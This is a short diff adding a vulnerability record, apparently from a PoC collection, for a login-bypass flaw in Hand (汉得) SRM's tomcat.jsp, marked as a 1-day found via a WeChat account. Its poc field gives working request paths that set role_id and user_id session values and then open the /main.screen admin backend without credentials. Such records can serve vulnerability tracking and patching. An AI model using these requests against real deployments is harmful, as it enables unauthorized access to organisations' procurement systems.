@@ -1,0 +1,7 @@
+vendor = "汉得"
+name = "汉得SRM tomcat.jsp 登录绕过漏洞"
+type = "认证绕过"
+source = "公众号"
+date = "08.10"
+poc = "/tomcat.jsp?dataName=role_id&dataValue=1 /tomcat.jsp?dataName=user_id&dataValue=1 然后访问后台：/main.screen"
+label = "1day"
